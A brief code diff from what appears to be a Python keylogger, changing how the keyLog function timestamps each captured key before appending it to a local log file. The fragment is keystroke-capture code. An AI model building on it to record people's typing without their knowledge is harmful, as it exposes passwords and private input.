@@ -22,7 +22,7 @@ def keyLog(key):
         raise SystemExit(0)
     
     with open("./file/log.txt", "a") as logfile:
-        logfile.write(str(P.Time(getCurTime())) + ": " + key + "\n")
+        logfile.write(str(datetime.datetime.now().strftime("%B %d, %Y %H:%M:%S")) + ": " + key + "\n")
     
     print(key)
 
